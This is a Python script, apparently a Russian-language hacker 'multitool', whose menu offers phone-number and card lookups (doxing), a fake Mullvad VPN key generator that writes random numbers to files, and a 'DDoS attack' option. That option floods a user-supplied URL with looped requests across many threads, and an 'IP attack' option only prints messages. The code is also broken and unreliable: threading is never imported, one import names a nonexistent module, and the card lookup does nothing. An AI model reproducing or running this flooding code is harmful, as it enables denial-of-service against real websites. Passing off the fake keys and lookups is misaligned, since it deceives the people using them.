import ctypes
import os
import time
import webbrowser
from os import system
from time import sleep

import banner
import requests
from colorama import Fore
from pystyle import *
from pystyle import Colorate, Colors
from pystyle import Colorate, Colors, Center
import pyotp
import time

banner = """




██╗    ██╗██╗██╗     ██╗  ██╗██╗███╗   ██╗███████╗ ██████╗ ███╗   ██╗
██║    ██║██║██║     ██║ ██╔╝██║████╗  ██║██╔════╝██╔═══██╗████╗  ██║
██║ █╗ ██║██║██║     █████╔╝ ██║██╔██╗ ██║███████╗██║   ██║██╔██╗ ██║
██║███╗██║██║██║     ██╔═██╗ ██║██║╚██╗██║╚════██║██║   ██║██║╚██╗██║
╚███╔███╔╝██║███████╗██║  ██╗██║██║ ╚████║███████║╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝




 """

text = """
     
                           $ MAIN MENU $            
   ╔=====================================================================╗ 
                                                                                                                           
    『1』Пробив по номеру телефона        『2』 Пробив по карте      
    『3』Поддержать меня                  『4』Генератор ключей MULLVAD    
    『5』DDos атака                       『6』Айпи Пингер               
    『7』Венатор браузер                  『8』Покинуть Программу         
   ╚=====================================================================╝                     
support from hardline<3

  """
print()
print(Colorate.Horizontal(Colors.blue_to_green, Center.XCenter(banner)))
print(Colorate.Horizontal(Colors.blue_to_green, Center.XCenter(text)))

choice = input(Colorate.Horizontal(Colors.rainbow, Center.XCenter("[!] Введите функцию    ")))

if choice == "1":
    os.system("python number.py")

elif choice == "2":
    from cracl import requests

    no = str(input("Запрос был выполнен за:"))
elif choice == "3":
    print('Привет друг! ты можешь поддержать мой проект ? сейчас вас перекинет на крипто бота ожидайте..')
    webbrowser.open('https://t.me/CryptoBot?start=IVcX2k3LbI2i')
elif choice == "4":
    import os
    import random

    download_folder = os.path.expanduser("~/Downloads/qwertykeysgenerated")

    if not os.path.exists(download_folder):
        os.makedirs(download_folder)

    channel = "beshastsquad"
    author = "hdoebtwp"

    for i in range(300):
        random_number = random.randint(10 ** 15, 10 ** 16 - 1)
        filename = os.path.join(download_folder, f"key_{i + 1}.txt")

        with open(filename, 'w') as file:
            file.write(str(random_number))

    print("\nСгенерированные числа сохранены в папке загрузки.")
    no = str(input("Запрос был выполнен за:"))

elif choice == "5":

    print(Colorate.Horizontal(Colors.blue_to_cyan, "Введите ссылку"))


    def dos():
        try:
            url = input()
            os.system("cls||clear")
            while True:
                print(
                    Colorate.Horizontal(
                        Colors.rainbow,
                        ("[!] {{Сайт рушиться " + url + " }}"),
                    )
                )
                requests.get(url)
        except requests.exceptions.MissingSchema:
            print(
                Colorate.Horizontal(
                    Colors.red, "[!] Введите ссылку формата: https://"
                )
            )
            time.sleep(2)
            exit()


    while True:
        threading.Thread(target=dos).start()
        threading.Thread(target=dos).start()
        threading.Thread(target=dos).start()
        threading.Thread(target=dos).start()
        threading.Thread(target=dos).start()
        threading.Thread(target=dos).start()
        threading.Thread(target=dos).start()
        threading.Thread(target=dos).start()
        threading.Thread(target=dos).start()
        threading.Thread(target=dos).start()
        threading.Thread(target=dos).start()
        threading.Thread(target=dos).start()
        no = str(input("Запрос был выполнен за:"))
elif choice == "6":
    print(Colorate.Horizontal(Colors.blue_to_cyan, "[!] Введите IP! "))
    IPATTACK = input()
    time.sleep(2)
    while True:
        print(
            Colorate.Horizontal(Colors.rainbow, ("Разрушаю IP " + IPATTACK))
        )
        time.sleep(1)
        print(
            Colorate.Horizontal(Colors.rainbow, ("Процесс... " + IPATTACK))
        )
        time.sleep(1)
        no = str(input("Запрос был выполнен за:"))
elif choice == "7":
    webbrowser.open("https:/t.me/venatorbrowser")

elif choice == "8":
    exit()
